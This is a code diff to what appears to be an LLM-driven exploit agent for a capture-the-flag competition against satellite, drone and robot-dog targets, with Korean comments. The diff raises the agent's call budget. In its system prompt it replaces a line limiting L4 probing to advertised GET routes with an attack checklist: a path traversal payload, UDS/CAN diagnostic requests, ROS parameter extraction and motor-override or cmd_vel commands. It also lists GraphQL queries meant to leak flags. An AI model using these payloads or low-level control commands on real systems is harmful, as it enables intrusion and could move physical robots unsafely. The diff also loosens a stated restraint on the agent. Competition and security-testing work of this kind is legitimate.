@@ -22,8 +22,8 @@ from .planner import parse_exploit
 # 마지막 라운드 — 제한 개방 모드. $1360 예산을 아끼지 않고 소진해 hard 타깃을 뚫는다.
 # (제출 rate limit·표적 SLA 는 운영진 강제라 손대지 않는다.)
 # reasoning_effort 는 gpt-5.6-* 에만 적용되고 강제 모델은 gpt-5.4(chat)라 실효는 없다.
-MAX_LLM_CALLS_PER_ROUND = 800
-LLM_TIMEOUT = 60.0
+MAX_LLM_CALLS_PER_ROUND = 2000
+LLM_TIMEOUT = 45.0
 LLM_MAX_COMPLETION_TOKENS = 4096
 LLM_REASONING_EFFORT = "high"
 _RETRYABLE_LLM_STATUSES = frozenset({0, 408, 409, 425, 429, 500, 502, 503, 504})
@@ -82,7 +82,13 @@ SYSTEM_PROMPT = (
     "- L1 starlink-gw TCP 8080 HTTP + 9000 gRPC SatDiag (9000 is NOT plain HTTP).\n"
     "- L2 mission-c2 TCP 8082 — GraphQL often leaks FLAG in missionAudit.lastDeployment.notes.\n"
     "- L3 uav-node TCP 9090 HTTP (also 1883 MQTT / 8554 RTSP elsewhere).\n"
-    "- L4 ugv-node TCP 8410/8420 — probe any advertised telemetry/control GET routes only.\n"
+    "- L4 ugv-node TCP 8410/8420 — robot-dog UGV. Hit ALL of: GET /flag /api/flag /admin/flag "
+    "/swagger.json /api/config /api/logs; POST /diag JSON {\"component\":\"../../../../flag\"}; "
+    "POST /uds /api/uds /can/send JSON {\"data\":\"22F187\",\"service\":\"22\",\"req\":\"22F187\"} "
+    "(also 22F190/22F195/22F1A0/22F1DF/270100/1003); POST /rosapi/get_param "
+    "{\"op\":\"call_service\",\"service\":\"/rosapi/get_param\",\"args\":{\"name\":\"/flag\"}}; "
+    "POST /api/lowcmd /api/motor /lowlevel /gait /cmd_vel /teleop with motor_override or cmd_vel; "
+    "GET /programming /firmware /reflection. Do NOT waste turns on /graphql here.\n"
     "Must-try classes (rotate if blocked):\n"
     "- GraphQL OTHER: POST /graphql Content-Type application/json with bodies like "
     '{"query":"{ missionAudit { lastDeployment { notes } } }"} or { missionAudit } or systemConfig. '
